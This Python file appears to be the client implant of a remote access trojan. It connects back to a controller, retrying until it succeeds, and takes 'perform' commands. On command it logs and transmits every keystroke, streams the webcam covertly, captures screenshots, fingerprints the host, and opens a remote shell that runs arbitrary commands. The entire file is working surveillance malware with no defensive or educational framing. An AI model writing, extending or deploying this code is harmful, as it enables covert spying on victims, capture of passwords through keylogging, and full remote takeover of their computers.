import os
import pickle
import platform
import socket
import subprocess
import threading
import time
import zlib
import cv2
import imutils
import keyboard
import mss
import psutil
import struct
from config import *

global keylogging_active, wstreamer_active

def keylogging_thread(client_socket):
    def on_key_event(event):
        if event.event_type == keyboard.KEY_DOWN:
            key_name = event.name
            key_time = time.time()
            key_info = f"Keypress: {key_name} at {key_time}"
            client_socket.send(key_info.encode('utf-8'))

    keyboard.hook(on_key_event)
    while keylogging_active:  # Continuously capture and send key presses
        time.sleep(0.1)  # Add a small delay to avoid excessive CPU usage

    keyboard.unhook_all()  # Unhook key events


def wstreamer_thread(client_socket):
    # Connect to camserver
    cam_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cam_socket.connect((CLIENT_IP, CAM_CLIENT_PORT))

    client_socket.send(("Cam-Client spawned with Client PID : " + str(os.getpid())).encode('utf-8'))

    cam = cv2.VideoCapture(0)
    img_counter = 0
    desired_fps = CAM_FPS  # integer value for desired frames per second
    delay = 1 / desired_fps

    # encode to jpeg format with lower quality
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), CAM_IMAGE_QUALITY]

    while True:
        start_time = time.time()  # Record the start time of the loop

        ret, frame = cam.read()
        if not ret:
            break  # Handle potential camera disconnection

        frame = imutils.resize(frame, width=CAM_FRAME_WIDTH)
        frame = cv2.flip(frame, 180)
        result, image = cv2.imencode('.jpg', frame, encode_param)
        data = pickle.dumps(image, 0)
        size = len(data)

        cam_socket.sendall(struct.pack(">L", size) + data)

        img_counter += 1

        end_time = time.time()  # Record the end time
        processing_time = end_time - start_time
        sleep_time = max(0, delay - processing_time)  # Calculate remaining sleep time
        time.sleep(sleep_time)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cam.release()
    cam_socket.close()
    




def shell_worker(client_socket):
    while True:
        client_socket.send("#INSHELLMODE Enter shell command (or Send 'perform stop' to stop): ".encode('utf-8'))
        command = client_socket.recv(1024).decode('utf-8')

        if command == 'perform stop':
            break

        response = execute_shell_command(command)
        client_socket.send(response.encode('utf-8'))


def screen_shot(client_socket):
    with mss.mss() as sct:
        screenshot = sct.shot()  # Capture a screenshot
        # Compress and pickle the frame
        encoded_frame = pickle.dumps(screenshot)
        compressed_frame = zlib.compress(encoded_frame, level=zlib.Z_BEST_COMPRESSION)
        # Send the frame to the server
        client_socket.sendall(compressed_frame)


def execute_shell_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return str(e.output.decode('utf-8'))


def perform_task(task_name, client_socket):
    global keylogging_active, wstreamer_active

    if task_name == 'hello':
        return "Task: Hello, Server!"
    elif task_name == 'show_os_info':
        os_info = f"OS: {platform.system()} {platform.release()} Build: {platform.version()} {platform.architecture()}"
        return os_info
    elif task_name == 'show_hw_info':
        hw_info = ""

        # CPU Info
        hw_info += "[CPU Info]\n"
        hw_info += f"Processor: {platform.processor() or 'N/A'}\n"
        hw_info += f"Architecture: {platform.machine()}\n"
        hw_info += f"Cores (Physical): {psutil.cpu_count(logical=False)}\n"
        hw_info += f"Cores (Logical): {psutil.cpu_count(logical=True)}\n"
        hw_info += f"CPU Frequency: {psutil.cpu_freq().current:.2f} MHz\n"
        hw_info += f"CPU Usage: {psutil.cpu_percent(interval=1)}%\n\n"

        # RAM Info
        mem = psutil.virtual_memory()
        hw_info += "[Memory Info]\n"
        hw_info += f"Total: {mem.total / (1024 ** 3):.2f} GB\n"
        hw_info += f"Available: {mem.available / (1024 ** 3):.2f} GB\n"
        hw_info += f"Used: {mem.used / (1024 ** 3):.2f} GB\n"
        hw_info += f"Memory Usage: {mem.percent}%\n\n"

        # Disk Info
        disk = psutil.disk_usage('/')
        hw_info += "[Disk Info]\n"
        hw_info += f"Total: {disk.total / (1024 ** 3):.2f} GB\n"
        hw_info += f"Used: {disk.used / (1024 ** 3):.2f} GB\n"
        hw_info += f"Free: {disk.free / (1024 ** 3):.2f} GB\n"
        hw_info += f"Usage: {disk.percent}%\n\n"

        # Net Info
        hw_info += "[Net Info]\n"
        hw_info += f"Hostname: {socket.gethostname()}\n"
        hw_info += f"IP Address: {socket.gethostbyname(socket.gethostname())}\n\n"

        # Battery Info (if applicable)
        if hasattr(psutil, "sensors_battery"):
            battery = psutil.sensors_battery()
            if battery:
                hw_info += "[Battery Info]\n"
                hw_info += f"Percentage: {battery.percent}%\n"
                hw_info += f"Plugged In: {'Yes' if battery.power_plugged else 'No'}\n\n"
        return hw_info
    elif task_name == 'kstreamer':
        keylogging_active = True
        keylogging_thread_obj = threading.Thread(target=keylogging_thread, args=(client_socket,))
        keylogging_thread_obj.start()
        return "Keylogging started."
    elif task_name == 'wstreamer':
        wstreamer_active = True
        wstreamer_thread_obj = threading.Thread(target=wstreamer_thread, args=(client_socket,))
        wstreamer_thread_obj.start()
        return "Wstreamer started.\nPlease wait for minimum 10 seconds for stream propagation."
    elif task_name == 'sheller':
        shell_thread = threading.Thread(target=shell_worker, args=(client_socket,))
        shell_thread.start()
        shell_thread.join()
        return "Shell session ended."
    elif task_name == 'screener':
        client_socket.send("Sharing Screenshot...\n".encode('utf-8'))
        screen_share_thread = threading.Thread(target=screen_shot, args=(client_socket,))
        screen_share_thread.start()
        screen_share_thread.join()
        return "Screenshot sent to server"
    elif task_name == 'stop':
        keylogging_active = False
        wstreamer_active = False
        return "Keylogging and Wstreamer stopped."
    else:
        return "TERR"


def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client_socket.connect((CLIENT_IP, CLIENT_PORT))
            print("Connected to the server.")
            return client_socket
        except Exception as e:
            print("Connection failed. Retrying in 5 seconds...")
            print("Error:" + str(e))
            time.sleep(5)


def main():
    global keylogging_active, wstreamer_active # Define  global flags for keylogging and webcam stream state
    keylogging_active = False
    # global wstreamer_active  # Define a global flag for keylogging state
    wstreamer_active = False

    client_socket = connect_to_server()

    # Send CONOK message after connecting
    client_socket.send("CONOK".encode('utf-8'))

    while True:
        try:
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break

            parts = data.split()
            if len(parts) >= 2 and parts[0] == 'perform':
                task_name = parts[1]
                response = perform_task(task_name, client_socket)
                client_socket.send(response.encode('utf-8'))
        except Exception as e:
            print("Connection lost. Reconnecting...")
            client_socket = connect_to_server()
            client_socket.send("CONOK".encode('utf-8'))
            print("Error:" + str(e))

    client_socket.close()


if __name__ == "__main__":
    main()
